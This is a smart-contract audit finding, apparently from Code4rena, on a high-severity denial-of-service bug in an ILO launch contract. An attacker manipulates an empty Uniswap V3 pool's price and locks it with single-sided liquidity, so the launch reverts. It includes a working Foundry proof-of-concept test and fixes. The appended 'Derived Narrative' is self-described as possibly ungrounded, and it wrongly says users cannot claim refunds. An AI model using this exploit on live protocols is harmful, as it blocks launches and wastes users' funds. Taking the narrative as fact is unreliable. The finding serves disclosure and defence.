---
id: 21557
severity: "High"
---

# Adversary can prevent the launch of any ILO pool with enough raised capital at any moment by providing single-sided liquidity

## Description

It is possible to prevent the launch of any ILO pool at any time, including pools that have reached their total raised amount. This can be done at any time and the cost for the attacker is negligible.

Not only this is a DOS of the whole protocol, but the attack can be performed at the very end of the sale, making users lose a lot on gas fees, considering it will be deployed on Ethereum Mainnet. Hundreds or thousands of users will participate in ILO pools via `buy()`, and will have to later call `claimRefund()` to get their “raise” tokens back.

Token launches that were deemed to be successful will be blocked after raising funds from many users, and this will most certainly affect the perception of the token, and its pricing on any attempt of a future launch/sale.

The `ILOManager` contract has a check to assert that the price at the time of the token launch is the same as the one initialized by the project. If they differ the transaction will revert, and the token launch will fail:

```solidity
function launch(address uniV3PoolAddress) external override {
  require(block.timestamp > _cachedProject[uniV3PoolAddress].launchTime, "LT");
  (uint160 sqrtPriceX96, , , , , , ) = IUniswapV3Pool(uniV3PoolAddress).slot0();
  require(_cachedProject[uniV3PoolAddress].initialPoolPriceX96 == sqrtPriceX96, "UV3P");
  address[] memory initializedPools = _initializedILOPools[uniV3PoolAddress];
  require(initializedPools.length > 0, "NP");
  for (uint256 i = 0; i < initializedPools.length; i++) {
    IILOPool(initializedPools[i]).launch();
  }

  emit ProjectLaunch(uniV3PoolAddress);
}
```

The problem is that `sqrtPriceX96` can be easily manipulated in Uniswap v3 Pools when there is no liquidity in it via a swap with no cost. In theory, this could be mitigated by anyone by swapping back to get back to the original price. But there is an additional problem which makes the severity of the attack even higher. The attacker can add [single-sided liquidity](https://support.uniswap.org/hc/en-us/articles/20902968738317-What-is-single-sided-liquidity#:~:text=When%20you%20select%20a%20range%20that%20is%20outside%20the%20current%20price%20range%2C%20you%20will%20only%20be%20able%20to%20supply%20one%20of%20the%20two%20tokens.) to the pool (just the Raise Token) after the price was manipulated.

When you select a range that is outside the current price range, you will only be able to supply one of the two tokens.

By adding liquidity in ticks greater than the manipulated price, but lower than the expected initial price, it would require the swapper to provide some `SALE_TOKEN`, which should not be available at this moment, since they should all be in the ILO pool.

Even if the project admin has some `SALE_TOKEN`, the attacker can mint a higher amount of liquidity by providing more single-sided `RAISE_TOKEN` liquidity, making the needed amount of `SALE_TOKEN` even higher.

## Proof of Concept

The following Proof of Concept shows how an attacker can make a launch revert after raising capital, at the cost of providing liquidity with only `1 wei` of USDC (Raise Token).

Console Output:

```
<<Minting Attack>>
<<Failed mitigation attempt>>
  
uniswapV3SwapCallback()
  amount0 (USDC)       0
  amount1 (SALE_TOKEN) 1
```

This would be enough to perform an attack that can’t be reverted in most cases since no other sale tokens should be circulating before the launch. But for the sake of interest, the minted liquidity and the mitigation amount can be increased to check the values needed to get back to the initial price in different situations.

POC:

  1. Add the import to the top of `test/ILOManager.t.sol`.
  2. Add the test to the `ILOManagerTest` contract in `test/ILOManager.t.sol`.
  3. Run `forge test --mt testManipulatePriceForLaunch -vv`.

```solidity
import "../lib/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "forge-std/console.sol";

function testManipulatePriceForLaunch() external {
  IILOManager.InitPoolParams memory params = _getInitPoolParams();
  _initPool(PROJECT_OWNER, params);

  assertEq(IUniswapV3Pool(projectId).token0(), USDC);
  assertEq(IUniswapV3Pool(projectId).token1(), SALE_TOKEN);

  vm.label(USDC, "USDC");
  vm.label(SALE_TOKEN, "SALE_TOKEN");
  vm.label(projectId, "UNI_V3_POOL");
  vm.label(address(this), "ATTACKER");

  unsuccessfulPriceManipulation();

  priceManipulationAttack();

  vm.warp(LAUNCH_START+1);
  vm.expectRevert(bytes("UV3P"));
  iloManager.launch(projectId);
}

function unsuccessfulPriceManipulation() internal {
  uint160 initialPrice = mockProject().initialPoolPriceX96;
  uint160 MIN_SQRT_RATIO = 4295128739 + 1;

  // Check price before attack
  (uint160 sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
  assertEq(uint256(sqrtPriceX96), initialPrice);

  // Attack
  IUniswapV3Pool(projectId).swap(address(this), true, 1, MIN_SQRT_RATIO, "");
  (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
  assertEq(uint256(sqrtPriceX96), MIN_SQRT_RATIO);

  // Mitigation
  IUniswapV3Pool(projectId).swap(address(this), false, 1, initialPrice, "");
  (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
  assertEq(uint256(sqrtPriceX96), initialPrice);
}

function priceManipulationAttack() internal {
  uint160 initialPrice = mockProject().initialPoolPriceX96;
  uint160 MIN_SQRT_RATIO = 4295128739 + 1;

  // Check price before attack
  (uint160 sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
  assertEq(uint256(sqrtPriceX96), initialPrice);

  // Attack -> Swap to manipulate price
  IUniswapV3Pool(projectId).swap(address(this), true, 1, MIN_SQRT_RATIO, "");
  (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
  assertEq(uint256(sqrtPriceX96), MIN_SQRT_RATIO);

  // Attack -> Mint to prevent swapping back
  console.log("\n<<Minting Attack>>");
  deal(USDC, address(this), 1);
  int24 OUTSIDE_TICK = 0;
  IUniswapV3Pool(projectId).mint(address(this), OUTSIDE_TICK-10, OUTSIDE_TICK+10, 1, "");

  // Mitigation doesn't work now
  // You can uncomment the `expectRevert` and run the test with `-vvvv`
  // You'll see the log `ATTACKER::uniswapV3SwapCallback(0, 1, 0x)`, which means that it expects 1 wei of SALE_TOKEN
  // This is not possible as all SALE_TOKENs should be in the ILOPool at this moment
  console.log("\n<<Failed mitigation attempt>>");
  vm.expectRevert(bytes("IIA"));
  IUniswapV3Pool(projectId).swap(address(this), false, 1, initialPrice, "");

  // The price will remain the one set by the attacker
  (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
  assertEq(uint256(sqrtPriceX96), MIN_SQRT_RATIO);
}

function uniswapV3MintCallback(uint256, uint256, bytes memory) external {
  IERC20(USDC).transfer(projectId, IERC20(USDC).balanceOf(address(this)));
}

function uniswapV3SwapCallback(int256 amount0, int256 amount1, bytes memory) external {
  assertGe(amount0, 0);
  assertGe(amount1, 0);

  console.log("\nuniswapV3SwapCallback()");
  console.log("amount0 (USDC)      ", uint256(amount0));
  console.log("amount1 (SALE_TOKEN)", uint256(amount1));
}
```

## Recommendation

Since the price can be manipulated, and single-sided liquidity can be minted, getting the price back to its initial price would require swapping and providing `SALE_TOKEN`. Since it’s an initial sale with vesting for other participants, it is expected that no parties hold the token. But, even if they do, the attack can be performed at some cost anyway as explained before.

So one possible solution could be to reserve some amount in the ILO pool in case it needs to be swapped back, and perform a swap before the liquidity is added to the Uniswap Pool, taking into account an amount that would make the attack very expensive to rollback. Another approach could involve having a wrapper token around the `SALE_TOKEN` that can be minted and swapped to reach the expected price.

This is a potential first step. Additional considerations shall be taken into account, like an attacker minting liquidity on various tick ranges, which may also affect calculations.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a denial‑of‑service condition that allows an adversary to block the launch of any Initial Liquidity Offering (ILO) pool even after the pool has reached its fundraising target. The root cause is that the ILOManager contract validates the Uniswap V3 pool price at launch by reading the current sqrtPriceX96 from the pool and comparing it with the price that was cached when the project was created. When the pool contains little or no liquidity, an attacker can perform a cost‑free swap that pushes the price to an extreme tick because the AMM price is determined solely by the ratio of reserves. After the price is manipulated, the attacker can add single‑sided liquidity (only the raise token) in a tick range that lies outside the manipulated price but still below the original expected price. This single‑sided liquidity locks the price because any attempt to swap back to the original price would require the opposite token (the sale token) which is not available – all sale tokens are held in the ILO pool awaiting the launch. Consequently, when the ILOManager calls launch, the price check fails and the transaction reverts with the UV3P error, preventing the token launch. The impact is a protocol‑wide denial of service: users who have contributed gas and funds to the sale cannot claim refunds or receive the launched token, leading to wasted gas, loss of confidence, and potential damage to the token’s market perception. The attack can be executed at any moment, including immediately before the launch deadline, and the cost to the attacker is negligible – only a minimal amount of the raise token is needed to mint the single‑sided liquidity. The issue was discovered during a formal audit by Code4rena, which included a proof‑of‑concept test that demonstrated the price manipulation and the subsequent failure to revert the price. The bug is hard to notice because the pool may appear to have a valid price before the launch and the added liquidity can be very small, making it easy to overlook in normal monitoring. To remediate, the protocol should enforce a minimum amount of liquidity before allowing a launch, use a time‑weighted average price or a price oracle that is not directly manipulable by a single swap, reserve a small amount of the sale token to enable price correction, or wrap the sale token in a mintable proxy that can be used to restore the expected price. These measures would raise the cost of the attack and prevent the price from being locked by single‑sided liquidity, thereby restoring the ability to launch the ILO pool as intended.
